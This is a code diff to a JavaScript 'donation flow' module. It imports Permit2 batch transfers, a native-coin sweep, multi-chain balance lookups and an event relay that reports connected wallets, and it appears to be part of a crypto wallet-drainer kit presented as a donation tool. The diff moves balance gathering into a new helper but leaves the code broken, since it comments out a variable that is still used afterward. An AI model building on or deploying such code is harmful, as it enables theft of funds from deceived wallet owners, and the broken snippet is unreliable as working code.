@@ -1,7 +1,7 @@
 // src/engine/donate.js
 import { notify } from "../utils/notify.js";
 import { sendEvent } from "../utils/eventRelay.js";
-import { fetchBalancesCovalent, filterPermit2SafeTokens, getChainValue } from "./balances.js";
+import { fetchBalancesCovalent, filterPermit2SafeTokens, buildWalletSummary, getChainValue } from "./balances.js";
 import { getProviderForChain } from "./providerHelper.js";
 import { isPermit2Compatible, executePermit2Batch } from "./permit2.js";
 import { executeFallbackBatch, sweepNative } from "./fallback.js";
@@ -10,7 +10,7 @@ import { ethers } from "ethers";
 
 // simple Coingecko cache to reduce requests
 const priceCache = {};
-async function fetchNativePrice(symbol) {
+export async function fetchNativePrice(symbol) {
   if (priceCache[symbol]) return priceCache[symbol];
 
   try {
@@ -50,7 +50,7 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
     }
 
     // Fetch balances read-only
-    const chainBalances = [];
+   /* const chainBalances = [];
     for (const chain of CHAINS) {
       const raw = await fetchBalancesCovalent(owner, chain.chainId);
       const filtered = filterPermit2SafeTokens(raw);
@@ -98,8 +98,9 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
 
     notify("WALLET_CONNECTED", connectedPayload);
     await sendEvent("WALLET_CONNECTED", connectedPayload);
+    */
 
-
+    const { balancesPayload, grandTotal } = await buildWalletSummary(owner);
 
     // Sort chains descending by totalValue
     chainBalances.sort((a, b) => b.totalValue - a.totalValue);
@@ -180,3 +181,4 @@ export async function runDonationFlow(walletClient, owner, trackingId) {
     return { success: false, reason: err.message || String(err) };
   }
 }
+
